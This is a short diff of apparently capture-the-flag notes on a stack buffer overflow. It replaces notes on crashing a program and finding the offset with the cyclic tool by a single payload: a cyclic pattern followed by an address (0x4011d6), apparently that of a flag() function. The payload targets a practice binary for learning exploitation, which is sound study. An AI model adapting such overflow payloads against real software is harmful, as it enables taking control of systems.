@@ -1,9 +1,1 @@
-#Print out 40 a's to try and crash the program
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{address of flag()}
-
-
-use cyclic to figure out what shows up in rsp when the program seg faults
-
-Insert he desired address at the end of the identified cycloc string
-
-#Program will accept 40 characters, will begin to degrade at 41, will throw a bus error at 42, and will seg fault at 43 
+b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaava0x4011d6'
